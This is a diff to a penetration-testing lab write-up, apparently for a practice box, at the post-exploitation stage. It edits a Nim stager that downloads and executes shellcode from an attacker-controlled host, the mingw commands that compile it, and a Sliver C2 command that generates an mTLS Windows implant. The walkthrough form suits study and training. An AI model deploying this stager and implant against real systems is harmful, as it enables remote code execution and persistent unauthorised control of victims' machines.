@@ -65,7 +65,7 @@ and we got the result as `nt authority\system` and we've fully compromised the f
 #### Post Exploitation
 - Lets try to get a stable connection with `sliver C2`
 
-#### Shell.nim
+## stager.nim
 ```python
 import winim/lean
 import httpclient
@@ -90,11 +90,11 @@ proc DownloadExecute(url: string): void =
 
 when defined(windows):
   when isMainModule:
-    DownloadExecute("http://10.10.17.210/shellc.bin")
+    DownloadExecute("http://10.10.17.184/shellc.bin")
 ```
 
 - Make sure that that the ip matches our tun0 attack machine
-##### Compiling the shell.nim payload on kali linux
+##### Compiling the stager.nim payload on kali linux
 ```python
 sudo apt install mingw-w64
 sudo apt install nim
@@ -106,7 +106,7 @@ nim c -d:mingw --os:windows --cpu:amd64 --cc:gcc --gcc.exe:x86_64-w64-mingw32-gc
 
 #### Now, inside sliver
 ```python
-generate --mtls <tun0ip:port> --os windows --arch amd64 --format shellcode --save /home/tyler/hacksmarter/darkhaven/shellc.bin
+generate --mtls 10.10.17.184:9001 --os windows --arch amd64 --format shellcode --save shellc.bin
 ```
 - We've successfully generated the implant
 ##### Setting up sliver listener
